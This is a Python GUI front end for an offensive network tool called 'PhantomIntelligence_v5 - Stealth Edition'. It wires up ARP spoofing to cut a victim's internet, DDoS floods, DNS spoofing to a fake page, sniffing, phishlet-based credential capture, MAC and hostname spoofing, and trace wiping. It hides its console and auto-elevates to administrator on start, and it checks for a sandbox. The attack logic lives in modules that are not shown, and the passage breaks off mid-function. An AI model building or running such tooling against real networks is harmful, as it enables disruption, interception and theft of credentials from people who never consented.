"""
PhantomIntelligence_v5 - Herramienta de red avanzada con CustomTkinter.
Arquitectura modular separada en funciones y módulos de soporte.
"""

# ── Ocultar ventana de consola en Windows antes de iniciar la UI ──────────────
import sys
import os

if sys.platform == "win32":
    import ctypes as _ctypes
    _ctypes.windll.user32.ShowWindow(_ctypes.windll.kernel32.GetConsoleWindow(), 0)
# ─────────────────────────────────────────────────────────────────────────────

import customtkinter as ctk
import tkinter as tk
from tkinter import messagebox, filedialog
import threading
import time
import ctypes
import ipaddress

# Importar módulos de soporte
from modulos.config import *
from modulos.ui_helpers import *
from modulos.network_core import *
from modulos.system_utils import _auto_elevate, _restart_admin, _is_admin, is_sandbox
from modulos.logger_engine import LoggerEngine
from modulos.discovery import (
    clasificar_objetivo, _normalizar_mac, _buscar_ip_por_mac,
    _resolver_hostname,
)
from modulos.device_db import (
    guardar_escaneo, enriquecer_resultados, obtener_alias,
    establecer_alias, establecer_notas, obtener_notas,
    obtener_dispositivo,
)

# Auto-elevación de privilegios al inicio
# (si no somos admin, lanza proceso elevado y termina INMEDIATAMENTE)
_auto_elevate()

# Inicializar variables globales con valores rápidos y actualizar config
MAC       = _mac_propia()     # Rápido (uuid)
GATEWAY   = "—"               # Se actualiza en background
IP_LOCAL  = "127.0.0.1"      # Se actualiza en background
DIR_BASE  = os.path.dirname(os.path.abspath(__file__))

import modulos.config as config
config.MAC      = MAC
config.GATEWAY  = GATEWAY
config.IP_LOCAL = IP_LOCAL
config.DIR_BASE = DIR_BASE

# Importar módulos de funciones
from funciones.ghost   import GhostModule
from funciones.arp     import ARPModule
from funciones.mac     import MACModule
from funciones.scanner import ScannerModule
from funciones.ddos    import DDOSModule
from funciones.sniffer import SnifferModule
from funciones.universal_proxy import UniversalProxyModule
from funciones.dns_spoof import DNSSpoofModule

# Dependencias opcionales
try:
    from scapy.all import conf
    SCAPY_OK = True
except Exception:
    SCAPY_OK = False

# Tema global
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

# ─── Colores de estado de módulos ────────────────────────────────────────────
_MOD_ACTIVE_COLOR  = "#00e676"   # verde brillante  (módulo ON)
_MOD_IDLE_COLOR    = "#333333"   # gris oscuro       (módulo OFF)


def _init_network_bg():
    """Inicializa variables de red en background para no bloquear el arranque."""
    global GATEWAY, IP_LOCAL
    gw = _gateway()
    ip = _ip_local()
    GATEWAY   = gw
    IP_LOCAL  = ip
    config.GATEWAY  = gw
    config.IP_LOCAL = ip


import threading as _t_net
_t_net.Thread(target=_init_network_bg, daemon=True).start()


# ─────────────────────────────────────────────────────────────────────────────
class PinguExit:
    """Aplicación principal de PhantomIntelligence_v5."""

    def __init__(self, root: ctk.CTk):
        self.root = root
        self.root.title("PhantomIntelligence_v5 - Stealth Edition")
        self.root.geometry("1000x740")
        self.root.minsize(920, 620)

        # Asegurarse de que las funciones del sistema estén disponibles
        import modulos.system_utils
        self._is_admin        = modulos.system_utils._is_admin
        self._auto_elevate    = modulos.system_utils._auto_elevate
        self._restart_admin_func = modulos.system_utils._restart_admin

        # Inicializar motor de logging
        self.logger_engine = LoggerEngine()

        # Inicializar módulos
        self.ghost_module      = GhostModule(self.logger_engine)
        self.arp_module        = ARPModule(self.logger_engine)
        self.mac_module        = MACModule(self.logger_engine)
        self.scanner_module    = ScannerModule(self.logger_engine)
        self.ddos_module       = DDOSModule(self.logger_engine)
        self.sniffer_module    = SnifferModule(self.logger_engine)
        self.proxy_module      = UniversalProxyModule(self.logger_engine)
        self.dns_spoof_module  = DNSSpoofModule(self.logger_engine)

        # Variables de UI
        self._init_ui_vars()

        # Construir UI
        self._ui()

        # Iniciar bucle de vaciado de colas
        self._flush_loop()

        # Refrescar barra superior con datos de red cuando estén listos
        self._poll_network_info()

        if is_sandbox():
            self.logger_engine.log(
                "¡ADVERTENCIA: Entorno Sandbox / VM detectado! Algunas características nativas podrían fallar.",
                "warn"
            )
            self.logger_engine.write(
                self.consola,
                "\n[!] PRECAUCIÓN: Entorno Sandbox o Máquina Virtual detectado.\n"
                "[!] El comportamiento de la red estará filtrado por el hipervisor.\n\n"
            )

        # Validar Npcap/Scapy al inicio
        if not SCAPY_OK:
            self.root.after(400, self._check_npcap)

    # ── UI Vars ──────────────────────────────────────────────────────────────
    def _init_ui_vars(self):
        """Inicializa variables de UI."""
        # Widgets principales
        self.nb             = None
        self.consola        = None
        self._lbl_net_info  = None   # label reactivo de la barra superior

        # Badges de estado por módulo: {nombre_key: CTkLabel}
        self._badges: dict[str, ctk.CTkLabel] = {}

        # ── ARP ──
        self.arp_obj      = None   # Objetivo: IP, MAC o hostname
        self.arp_gw        = None
        self.arp_int       = None
        self.arp_stealth   = None
        self.arp_jitter    = None
        self.arp_oui_var   = None
        self.arp_track     = None   # Seguimiento dinámico (IP cambiante)
        self.arp_garp      = None   # Gratuitous ARP broadcast
        self.arp_multi     = None   # Modo multi-target
        self.arp_start_btn = None
        self.arp_stop_btn  = None
        self.arp_out       = None

        # ── MAC ──
        self.mac_iface = None
        self.mac_nueva = None
        self.mac_oui   = None
        self.mac_out   = None

        # ── Scanner ──
        self.scan_rango   = None
        self.scan_timeout = None
        self.scan_btn     = None
        self.scan_results_frame = None   # frame con filas interactivas
        self.scan_filter_var = None      # filtro en tiempo real
        self._scan_results_data = []     # datos crudos del último escaneo
        self._scan_hdr_frame = None      # header de la tabla

        # ── DDoS ──
        self.ddos_ip        = None
        self.ddos_pto       = None
        self.ddos_modo      = None
        self.ddos_start_btn = None
        self.ddos_stop_btn  = None
        self.ddos_out       = None

        # ── Sniffer ──
        self.sniff_filtro    = None
        self.sniff_start_btn = None
        self.sniff_stop_btn  = None
        self.sniff_count     = None
        self.sniff_out       = None

        # ── DNS Spoofing ──
        self.dns_dom        = None   # Entry: dominio
        self.dns_victima    = None   # Entry: IP víctima
        self.dns_pagina_var = None   # StringVar: página falsa
        self.dns_start_btn  = None
        self.dns_stop_btn   = None
        self.dns_out        = None

        # ── CAPTURA ──
        self.cap_out          = None
        self.cap_server_btn   = None
        self.cap_stop_btn     = None
        self.cap_proxy_btn    = None
        self.cap_phishlet_var = None
        self.cap_target       = None

        # ── Ghost ──
        self.ghost_hostname = None
        self.ghost_out      = None

    # ── Write / Log helpers ───────────────────────────────────────────────────
    def _write(self, widget, text):
        """Escribe en un widget usando el motor de logging."""
        self.logger_engine.write(widget, text)

    def _log(self, msg: str, tipo: str = "info"):
        """Añade mensaje al log global."""
        self.logger_engine.log(msg, tipo)

    # ── Badge helpers ─────────────────────────────────────────────────────────
    def _badge_set(self, key: str, active: bool):
        """Activa o desactiva un badge de estado de módulo."""
        lbl = self._badges.get(key)
        if lbl:
            lbl.configure(
                text_color=_MOD_ACTIVE_COLOR if active else _MOD_IDLE_COLOR
            )

    def _make_status_bar(self):
        """Crea la barra de estado inferior con badges de módulos activos."""
        bar = ctk.CTkFrame(self.root, height=22, corner_radius=0, fg_color="#080808")
        bar.pack(fill="x", side="bottom")
        bar.pack_propagate(False)

        modules = [
            ("arp",    "⚡ ARP"),
            ("ddos",   "💥 DDoS"),
            ("sniff",  "📡 Sniffer"),
            ("dns",    "🌐 DNS"),
        ]
        ctk.CTkLabel(bar, text="Estado: ", font=ctk.CTkFont(size=9),
                     text_color="#444444").pack(side="left", padx=(8, 2))
        for key, label in modules:
            lbl = ctk.CTkLabel(
                bar, text=label,
                font=ctk.CTkFont(size=9, weight="bold"),
                text_color=_MOD_IDLE_COLOR
            )
            lbl.pack(side="left", padx=4)
            self._badges[key] = lbl

    # ── Network info reactive polling ─────────────────────────────────────────
    def _poll_network_info(self):
        """Comprueba si la red ya cargó y actualiza el label. Se repite hasta que haya datos."""
        gw = config.GATEWAY
        ip = config.IP_LOCAL
        if self._lbl_net_info:
            self._lbl_net_info.configure(
                text=f"GW: {gw}   IP: {ip}   MAC: {MAC}",
                text_color="#90a4ae" if (gw != "—" and ip != "127.0.0.1") else "#555555"
            )

        # Rellenar el campo Gateway de ARP automáticamente cuando esté disponible
        if gw and gw != "—" and self.arp_gw is not None:
            valor_actual = self.arp_gw.get().strip()
            if valor_actual in ("", "—"):
                self.arp_gw.delete(0, "end")
                self.arp_gw.insert(0, gw)

        # Rellenar el rango de red del Escáner automáticamente cuando esté disponible
        if gw and gw != "—" and self.scan_rango is not None:
            rango_actual = self.scan_rango.get().strip()
            rango_real   = self.scanner_module.get_default_range()
            # Solo actualiza si el campo tiene el valor por defecto genérico o está vacío
            if rango_actual in ("", "192.168.1.0/24"):
                self.scan_rango.delete(0, "end")
                self.scan_rango.insert(0, rango_real)

        # Si aún no tenemos datos reales, seguimos preguntando cada 500ms
        if gw == "—" or ip == "127.0.0.1":
            self.root.after(500, self._poll_network_info)


    # ── UI principal ──────────────────────────────────────────────────────────
    def _ui(self):
        """Construye la interfaz de usuario."""
        # Barra superior
        top = ctk.CTkFrame(self.root, height=46, corner_radius=0, fg_color="#080808")
        top.pack(fill="x")
        top.pack_propagate(False)

        ctk.CTkLabel(
            top, text=" ⚡ PhantomIntelligence_v5 - Stealth Edition",
            font=ctk.CTkFont(size=18, weight="bold"),
            text_color="#4fc3f7"
        ).pack(side="left", padx=12)

        right_frame = ctk.CTkFrame(top, fg_color="transparent")
        right_frame.pack(side="right", fill="y")

        if not self._is_admin():
            self._btn(right_frame, "🛡️ Reiniciar como Admin", self._restart_admin,
                      "#b71c1c", width=140, height=28).pack(side="left", padx=(0, 15), pady=9)

        # Label reactivo (texto y color se actualizan en _poll_network_info)
        self._lbl_net_info = ctk.CTkLabel(
            right_frame,
            text=f"GW: {GATEWAY}   IP: {IP_LOCAL}   MAC: {MAC}",
            font=ctk.CTkFont(size=10),
            text_color="#555555"
        )
        self._lbl_net_info.pack(side="left", padx=14)

        # ── Elementos fijos inferiores (anclados abajo con side="bottom" para que siempre sean visibles) ──
        # 1. Barra de estado inferior con badges
        self._make_status_bar()

        # 2. Consola de registro global (siempre visible, altura ampliada para ver bien los registros)
        self.consola = _out(self.root, height=6, expand=False, side="bottom", padx=12, pady=(0, 4))

        # 3. Barra de control del registro global (justo encima de la consola)
        bar = ctk.CTkFrame(self.root, height=24, corner_radius=0, fg_color="#0d0d0d")
        bar.pack(fill="x", side="bottom")
        bar.pack_propagate(False)

        ctk.CTkLabel(bar, text=" REGISTRO GLOBAL",
                     font=ctk.CTkFont(size=10, weight="bold"),
                     text_color="#546e7a").pack(side="left", padx=8)

        # Botones de la barra de registro
        _bf_log = ctk.CTkFrame(bar, fg_color="transparent")
        _bf_log.pack(side="right", padx=4)

        ctk.CTkButton(_bf_log, text="💾 Guardar",   width=68, height=18,
                      font=ctk.CTkFont(size=10),
                      fg_color="#1a1a1a", hover_color="#252525",
                      command=self._log_guardar
                      ).pack(side="left", padx=2, pady=3)

        ctk.CTkButton(_bf_log, text="📋 Copiar",    width=68, height=18,
                      font=ctk.CTkFont(size=10),
                      fg_color="#1a1a1a", hover_color="#252525",
                      command=self._log_copiar
                      ).pack(side="left", padx=2, pady=3)

        ctk.CTkButton(_bf_log, text="Limpiar",      width=60, height=18,
                      font=ctk.CTkFont(size=10),
                      fg_color="#1a1a1a", hover_color="#252525",
                      command=lambda: self.consola.delete("1.0", "end")
                      ).pack(side="left", padx=(2, 8), pady=3)

        # ── Pestañas principales (se expanden llenando TODO el espacio central) ──
        self.nb = ctk.CTkTabview(
            self.root, corner_radius=8,
            fg_color="#141414",
            segmented_button_fg_color="#0d0d0d",
            segmented_button_selected_color="#0d47a1",
            segmented_button_unselected_color="#0d0d0d",
            segmented_button_selected_hover_color="#1565c0",
            text_color="#9e9e9e",
            text_color_disabled="#444444",
        )
        self.nb.pack(fill="both", expand=True, padx=12, pady=(6, 2))

        tabs = [
            ("🔍 Escáner",     self._build_scanner),
            ("⚡ ARP",         self._build_arp),
            ("🎭 MAC",         self._build_mac),
            ("👻 GHOST",       self._build_ghost),
            ("💥 DDoS",        self._build_ddos),
            ("📡 Sniffer",     self._build_sniffer),
            ("🌐 DNS",         self._build_dns),
            ("🪤 CAPTURA",     self._build_captura),
        ]
        for nombre, fn in tabs:
            self.nb.add(nombre)
            fn(self.nb.tab(nombre))

        # Tags de color para la consola
        for tag, color in COL.items():
            self.consola.tag_config(tag, foreground=color)

        self._log("[*] PhantomIntelligence_v5 listo.", "ok")
        if not self._is_admin():
            self._log("[!] ATENCIÓN: Funciones ocultas desactivadas sin modo Administrador.", "warn")
        if not SCAPY_OK:
            self._log("[!] Scapy no disponible — instala Npcap: https://npcap.com/#download", "err")

    # ── Log toolbar actions ───────────────────────────────────────────────────
    def _log_copiar(self):
        """Copia el contenido del log global al portapapeles."""
        try:
            texto = self.consola.get("1.0", "end")
            self.root.clipboard_clear()
            self.root.clipboard_append(texto)
        except Exception as e:
            messagebox.showinfo("Copiar Log", f"Error: {e}", parent=self.root)

    def _log_guardar(self):
        """Guarda el log global en un archivo de texto."""
        try:
            ruta = filedialog.asksaveasfilename(
                title="Guardar log",
                defaultextension=".txt",
                filetypes=[("Texto", "*.txt"), ("Todos", "*.*")],
                initialfile=f"phantom_log_{time.strftime('%Y%m%d_%H%M%S')}.txt",
            )
            if ruta:
                with open(ruta, "w", encoding="utf-8") as f:
                    f.write(self.consola.get("1.0", "end"))
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo guardar: {e}", parent=self.root)

    # ── Helpers de UI ─────────────────────────────────────────────────────────
    def _btn(self, parent, text, cmd, color="#1565c0", **kw):
        """Botón estándar."""
        return _btn(parent, text, cmd, color, **kw)

    def _flush_loop(self):
        """Bucle de vaciado de colas."""
        self.logger_engine.flush_queues(self.root, self.consola, self.sniff_count)
        self.root.after(80, self._flush_loop)

    def _restart_admin(self):
        """Reinicia como administrador."""
        try:
            self._restart_admin_func()
            self.root.destroy()
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo elevar privilegios: {e}", parent=self.root)

    def _npcap_warn(self):
        """Muestra advertencia de Npcap/Scapy."""
        messagebox.showerror(
            "Npcap/Scapy requerido",
            "Scapy o Npcap no están instalados.\n\n"
            "1) Ejecuta en consola: pip install scapy\n"
            "2) Descarga Npcap: https://npcap.com/#download\n"
            "   (Activa 'WinPcap API-compatible mode' al instalar).",
            parent=self.root
        )

    # ═════════════════════════════════════════════════════════════════════════
    #  CONSTRUCCIÓN DE PESTAÑAS
    # ═════════════════════════════════════════════════════════════════════════

    # ── GHOST ────────────────────────────────────────────────────────────────
    def _build_ghost(self, p):
        """Construye la pestaña GHOST."""
        _pad(p)
        ctk.CTkLabel(p, text="GHOST — Ocultación y Evasión Avanzada",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0, 6))

        self.ghost_hostname = _campo(p, "Nuevo Hostname:", "Ej: DESKTOP-X1Y2Z3")

        bf = _btn_row(p)
        self._btn(bf, "🎭 Spoofear Hostname",  self._ghost_spoof_hostname, "#e65100").pack(side="left", padx=(0, 10))
        self._btn(bf, "🐧 Emular TTL (Linux)", self._ghost_emulate_ttl,   "#2e7d32").pack(side="left", padx=(0, 10))
        self._btn(bf, "🧹 Limpiar Rastros Red",self._ghost_clean_traces,  "#b71c1c").pack(side="left", padx=(0, 10))
        self._btn(bf, "🔄 Restaurar Originales",self._ghost_restore,      "#01579b").pack(side="left")

        _sep(p)
        self.ghost_out = _out(p, 10)

    def _ghost_spoof_hostname(self):
        nuevo_nombre = self.ghost_hostname.get().strip()
        if not nuevo_nombre:
            messagebox.showwarning("Aviso", "Introduce un nuevo nombre de host.")
            return
        self.ghost_module.spoof_hostname(nuevo_nombre, lambda txt: self._write(self.ghost_out, txt))

    def _ghost_emulate_ttl(self):
        self.ghost_module.emulate_ttl(lambda txt: self._write(self.ghost_out, txt))

    def _ghost_clean_traces(self):
        self.ghost_module.clean_traces(lambda txt: self._write(self.ghost_out, txt))

    def _ghost_restore(self):
        self.ghost_module.restore_ghost(lambda txt: self._write(self.ghost_out, txt))

    def _check_npcap(self):
        resp = messagebox.askokcancel(
            "⚠️ Npcap no detectado",
            "Scapy o Npcap no están instalados correctamente.\n\n"
            "Sin Npcap, las siguientes funciones NO funcionarán:\n"
            "  • ARP Spoofing\n  • Escáner de red\n"
            "  • DDoS (SYN/UDP/Ping Flood)\n  • Sniffer\n  • DNS Spoofing\n\n"
            "¿Abrir la página de descarga de Npcap ahora?",
            parent=self.root
        )
        if resp:
            import webbrowser
            webbrowser.open("https://npcap.com/#download")

    # ── ARP ──────────────────────────────────────────────────────────────────
    def _build_arp(self, p):
        """Construye la pestaña ARP."""
        _pad(p)
        ctk.CTkLabel(p, text="ARP Spoofing — Corte total de internet (bidireccional)",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0, 6))

        ctk.CTkLabel(
            p,
            text="Objetivo: IP fija · MAC de hardware (seg. L2) · hostname (mDNS/NetBIOS) · * (toda la subred)",
            font=ctk.CTkFont(size=10), text_color="#546e7a"
        ).pack(anchor="w", padx=4, pady=(0, 2))

        self.arp_obj = _campo(
            p, "Objetivo (IP/MAC/host/*):",
            "Ej: 192.168.1.50 · AA:BB:CC:DD:EE:FF · iPhone.local · * (todos)",
            width=320
        )
        self.arp_gw  = _campo(p, "Gateway (vacío=auto):",    valor=GATEWAY)
        self.arp_int = _campo(p, "Intervalo base (s):",      valor="2", width=80)

        # Fila de seguimiento dinámico + pre-resolución
        track_row = ctk.CTkFrame(p, fg_color="transparent")
        track_row.pack(fill="x", pady=(0, 2))
        self.arp_track = ctk.BooleanVar(value=True)
        ctk.CTkSwitch(track_row, text="🎯 Seguimiento dinámico (IP cambiante)",
                      variable=self.arp_track,
                      font=ctk.CTkFont(size=12)).pack(side="left", padx=(0, 12))
        self._btn(track_row, "🔎 Resolver objetivo", self._arp_resolver,
                  "#1565c0", width=170).pack(side="right")

        # Opciones de evasión
        opts = ctk.CTkFrame(p, fg_color="#111111", corner_radius=6)
        opts.pack(fill="x", pady=6)
        ctk.CTkLabel(opts, text="  Opciones de evasión",
                     font=ctk.CTkFont(size=11, weight="bold"),
                     text_color="#455a64").pack(anchor="w", padx=8, pady=(6, 2))

        orow = ctk.CTkFrame(opts, fg_color="transparent")
        orow.pack(fill="x", pady=(0, 4), padx=8)
        self.arp_stealth = ctk.BooleanVar(value=True)
        self.arp_jitter  = ctk.BooleanVar(value=True)
        self.arp_oui_var = ctk.StringVar(value="Ninguno")

        ctk.CTkSwitch(orow, text="Rate Limiting dinámico",
                      variable=self.arp_stealth,
                      font=ctk.CTkFont(size=12)).pack(side="left", padx=(0, 16))
        ctk.CTkSwitch(orow, text="Jitter aleatorio",
                      variable=self.arp_jitter,
                      font=ctk.CTkFont(size=12)).pack(side="left", padx=(0, 16))

        orow2 = ctk.CTkFrame(opts, fg_color="transparent")
        orow2.pack(fill="x", pady=(0, 4), padx=8)
        ctk.CTkLabel(orow2, text="Spoofear fabricante MAC:",
                     font=ctk.CTkFont(size=12)).pack(side="left", padx=(0, 8))
        ctk.CTkOptionMenu(orow2, values=["Ninguno", "Apple", "Samsung", "Genérico"],
                          variable=self.arp_oui_var, width=130,
                          fg_color="#1a1a1a", button_color="#1565c0",
                          font=ctk.CTkFont(size=12)).pack(side="left")

        # Opciones avanzadas: GARP + Multi-target
        orow3 = ctk.CTkFrame(opts, fg_color="transparent")
        orow3.pack(fill="x", pady=(0, 8), padx=8)
        self.arp_garp = ctk.BooleanVar(value=False)
        ctk.CTkSwitch(orow3, text="📡 Gratuitous ARP (broadcast a toda la red)",
                      variable=self.arp_garp,
                      font=ctk.CTkFont(size=12)).pack(side="left", padx=(0, 16))

        bf = _btn_row(p)
        self.arp_start_btn = self._btn(bf, "▶ Iniciar ARP Spoof", self._arp_start, "#c62828")
        self.arp_start_btn.pack(side="left", padx=(0, 10))
        self.arp_stop_btn = self._btn(bf, "■ Detener + Restaurar", self._arp_stop, "#37474f")
        self.arp_stop_btn.configure(state="disabled")
        self.arp_stop_btn.pack(side="left")

        _sep(p)
        self.arp_out = _out(p, 7)

    def _arp_start(self):
        if not SCAPY_OK:
            self._npcap_warn()
            return

        objetivo = self.arp_obj.get().strip()
        if not objetivo:
            messagebox.showwarning(
                "Aviso",
                "Introduce el objetivo (IP, MAC, hostname o * para toda la subred)."
            )
            return

        gw = self.arp_gw.get().strip() or GATEWAY
        if gw:
            try:
                ipaddress.ip_address(gw)
            except ValueError:
                messagebox.showwarning(
                    "Error de Entrada", "La IP del Gateway no tiene un formato válido."
                )
                return

        try:
            interval = float(self.arp_int.get() or 2)
        except ValueError:
            interval = 2
        oui = self.arp_oui_var.get().lower()
        seguimiento = self.arp_track.get()
        garp = self.arp_garp.get()

        # Detectar modo multi-target: "*" o lista separada por comas
        is_multi = objetivo == "*" or "," in objetivo

        if is_multi:
            # Modo multi-target
            if objetivo == "*":
                targets_list = "*"
            else:
                targets_list = [t.strip() for t in objetivo.split(",") if t.strip()]
                if not targets_list:
                    messagebox.showwarning(
                        "Aviso", "La lista de objetivos está vacía."
                    )
                    return

            if self.arp_module.start_multi_attack(
                targets_list, gw, interval, self.arp_stealth.get(),
                self.arp_jitter.get(), oui,
                lambda txt: self._write(self.arp_out, txt), self._arp_stop,
                garp=garp
            ):
                self.arp_start_btn.configure(state="disabled", fg_color="#37474f")
                self.arp_stop_btn.configure(state="normal", fg_color="#c62828")
                self.arp_out.delete("1.0", "end")
                self._badge_set("arp", True)
        else:
            # Modo single-target (original)
            # Validación según el tipo de objetivo detectado
            modo = clasificar_objetivo(objetivo)
            if modo == "ip":
                try:
                    ipaddress.ip_address(objetivo)
                except ValueError:
                    messagebox.showwarning(
                        "Error de Entrada", "La IP de la víctima no tiene un formato válido."
                    )
                    return
            elif modo == "mac":
                if not _normalizar_mac(objetivo):
                    messagebox.showwarning(
                        "Error de Entrada", "La MAC no tiene un formato válido (AA:BB:CC:DD:EE:FF)."
                    )
                    return
            # modo "host": cualquier texto no vacío es un hostname válido

            if self.arp_module.start_attack(
                objetivo, gw, interval, self.arp_stealth.get(),
                self.arp_jitter.get(), oui, seguimiento,
                lambda txt: self._write(self.arp_out, txt), self._arp_stop,
                garp=garp
            ):
                self.arp_start_btn.configure(state="disabled", fg_color="#37474f")
                self.arp_stop_btn.configure(state="normal", fg_color="#c62828")
                self.arp_out.delete("1.0", "end")
                self._badge_set("arp", True)

    def _arp_resolver(self):
        """Pre-resuelve el objetivo (IP/MAC/hostname) sin atacar."""
        if not SCAPY_OK:
            self._npcap_warn()
            return

        objetivo = self.arp_obj.get().strip()
        if not objetivo:
            messagebox.showwarning(
                "Aviso", "Introduce el objetivo (IP, MAC o hostname)."
            )
            return

        self.arp_out.delete("1.0", "end")
        self.arp_module.diagnosticar(
            objetivo,
            lambda txt: self._write(self.arp_out, txt),
        )

    def _arp_stop(self):
        self.arp_module.stop_attack(lambda txt: self._write(self.arp_out, txt))
        self.arp_start_btn.configure(state="normal", fg_color="#c62828")
        self.arp_stop_btn.configure(state="disabled", fg_color="#37474f")
        self._badge_set("arp", False)

    # ── MAC ──────────────────────────────────────────────────────────────────
    def _build_mac(self, p):
        """Construye la pestaña MAC."""
        _pad(p)
        ctk.CTkLabel(p, text="MAC Spoofing — Cambio de identidad de red",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0, 6))

        self.mac_iface = _campo(p, "Interfaz:", valor="Ethernet" if os.name == "nt" else "eth0")
        self.mac_nueva = _campo(p, "Nueva MAC (manual/gen.):", placeholder="AA:BB:CC:DD:EE:FF")

        oui_row = ctk.CTkFrame(p, fg_color="transparent")
        oui_row.pack(fill="x", pady=3)
        ctk.CTkLabel(oui_row, text="Generar MAC (Ejemplos):", width=170, anchor="w",
                     font=ctk.CTkFont(size=12)).pack(side="left")
        self.mac_oui = ctk.StringVar(value="Aleatorio")
        ctk.CTkOptionMenu(oui_row, values=["Aleatorio", "Apple", "Samsung", "Genérico"],
                          variable=self.mac_oui, width=130,
                          fg_color="#1a1a1a", button_color="#1565c0",
                          font=ctk.CTkFont(size=12)).pack(side="left")

        def _generar_mac():
            oui = self.mac_oui.get().lower()
            nueva = self.mac_module.generate_random_mac(oui if oui != "aleatorio" else None)
            self.mac_nueva.delete(0, "end")
            self.mac_nueva.insert(0, nueva.upper())

        self._btn(oui_row, "Generar", _generar_mac, "#2e7d32", width=70).pack(side="left", padx=10)

        bf = _btn_row(p)
        self._btn(bf, "Aplicar MAC",         self._mac_aplicar,  "#e65100").pack(side="left", padx=(0, 10))
        self._btn(bf, "📋 Listar Interfaces", self._mac_listar,  "#1565c0").pack(side="left", padx=(0, 10))
        self._btn(bf, "MAC propia",
                  lambda: self._log(f"[MAC] Original: {MAC}", "info"), "#37474f").pack(side="left")

        _sep(p)
        self.mac_out = _out(p, 10)

    def _mac_aplicar(self):
        iface = self.mac_iface.get().strip()
        oui   = self.mac_oui.get().lower()
        nueva = (self.mac_nueva.get().strip() or
                 self.mac_module.generate_random_mac(oui if oui != "aleatorio" else None)).upper()
        self.mac_out.delete("1.0", "end")
        self.mac_module.apply_mac_change(iface, nueva, lambda txt: self._write(self.mac_out, txt))

    def _mac_listar(self):
        self.mac_out.delete("1.0", "end")
        self._write(self.mac_out, "» Escaneando interfaces de red (ipconfig /all)...\n")
        self._write(self.mac_out, "─"*48 + "\n")
        self.mac_module.find_interfaces(write_callback=lambda txt: self._write(self.mac_out, txt))
        self._write(self.mac_out, "─"*48 + "\n")
        self._write(self.mac_out, "✓ Usa el nombre exacto de la interfaz en el campo superior.\n")

    # ── ESCÁNER ───────────────────────────────────────────────────────────────
    def _build_scanner(self, p):
        """Construye la pestaña Escáner con tabla interactiva de resultados."""
        _pad(p, 4)
        ctk.CTkLabel(p, text="Escáner LAN — Descubrimiento de dispositivos",
                     font=ctk.CTkFont(size=14, weight="bold"),
                     text_color="#4fc3f7").pack(anchor="w", padx=4, pady=(0, 6))

        # Fila de controles: rango, timeout, botones
        ctrl_row = ctk.CTkFrame(p, fg_color="transparent")
        ctrl_row.pack(fill="x", pady=(0, 6))

        ctk.CTkLabel(ctrl_row, text="Rango:", width=50, anchor="w",
                     font=ctk.CTkFont(size=13)).pack(side="left")
        rango_def = self.scanner_module.get_default_range()
        self.scan_rango = ctk.CTkEntry(ctrl_row, width=170, fg_color="#111111",
                                        border_color="#2a2a2a",
                                        font=ctk.CTkFont(size=13))
        self.scan_rango.insert(0, rango_def)
        self.scan_rango.pack(side="left", padx=(0, 10))

        ctk.CTkLabel(ctrl_row, text="Timeout:", width=65, anchor="w",
                     font=ctk.CTkFont(size=13)).pack(side="left")
        self.scan_timeout = ctk.CTkEntry(ctrl_row, width=50, fg_color="#111111",
                                          border_color="#2a2a2a",
                                          font=ctk.CTkFont(size=13))
        self.scan_timeout.insert(0, "3")
        self.scan_timeout.pack(side="left", padx=(0, 12))

        self.scan_btn = self._btn(ctrl_row, "🔍 Escanear", self._scan_start,
                                   "#00695c", width=130, height=36)
        self.scan_btn.pack(side="left", padx=(0, 6))

        self._btn(ctrl_row, "💾 Guardar en BD", self._scan_guardar_bd,
                  "#1565c0", width=140, height=36).pack(side="left", padx=(0, 4))

        # Barra de filtro en tiempo real
        filter_row = ctk.CTkFrame(p, fg_color="#0d0d0d", corner_radius=6)
        filter_row.pack(fill="x", pady=(0, 6), ipady=4)
        ctk.CTkLabel(filter_row, text=" 🔎 Buscar:",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#90a4ae", width=85, anchor="w").pack(side="left", padx=(6, 0))
        self.scan_filter_var = ctk.StringVar()
        self.scan_filter_var.trace_add("write", lambda *_: self._scan_apply_filter())
        filt_entry = ctk.CTkEntry(filter_row, textvariable=self.scan_filter_var,
                                   width=300, fg_color="#141414",
                                   border_color="#333333",
                                   font=ctk.CTkFont(size=13),
                                   placeholder_text="Escribe para filtrar: IP, MAC, hostname, alias...")
        filt_entry.pack(side="left", padx=(0, 12))

        self._scan_lbl_count = ctk.CTkLabel(filter_row, text="",
                                             font=ctk.CTkFont(size=12, weight="bold"),
                                             text_color="#69f0ae")
        self._scan_lbl_count.pack(side="left")

        # Cabecera de la tabla (columnas centradas y con mayor separación)
        self._scan_hdr_frame = ctk.CTkFrame(p, fg_color="#141418", corner_radius=5)
        self._scan_hdr_frame.pack(fill="x", pady=(2, 0))
        for txt, w in [("SO", 55), ("IP", 105), ("MAC", 130), ("Hostname", 110),
                       ("Etiqueta", 140), ("Rol", 65),
                       ("ARP", 40), ("MAC", 40), ("DDoS", 44), ("Acción", 120)]:
            ctk.CTkLabel(self._scan_hdr_frame, text=txt, width=w, anchor="center",
                         font=ctk.CTkFont(size=12, weight="bold"),
                         text_color="#78909c").pack(side="left", padx=3, pady=5)

        # Contenedor scrollable de resultados
        self.scan_results_frame = ctk.CTkScrollableFrame(
            p, fg_color="#0a0a0a", corner_radius=0,
            scrollbar_button_color="#252525",
            scrollbar_button_hover_color="#333333",
        )
        self.scan_results_frame.pack(fill="both", expand=True, pady=(0, 0))

    def _scan_start(self):
        if not SCAPY_OK:
            self._npcap_warn()
            return

        rango = self.scan_rango.get().strip()
        try:
            timeout = int(self.scan_timeout.get())
        except ValueError:
            timeout = 3

        self.scan_btn.configure(state="disabled", text="Escaneando…")
        # Mantener los dispositivos previos visibles en pantalla mientras se escanea
        if self._scan_results_data:
            self._scan_lbl_count.configure(
                text=f"🔄 Escaneando... ({len(self._scan_results_data)} anteriores en pantalla)",
                text_color="#ffb74d"
            )
        else:
            self._scan_lbl_count.configure(text="🔄 Escaneando red...", text_color="#ffb74d")

        self.scanner_module.scan_network(
            rango, timeout,
            write_callback   = lambda txt: None,
            stop_callback    = lambda: self.scan_btn.configure(state="normal", text="🔍 Escanear"),
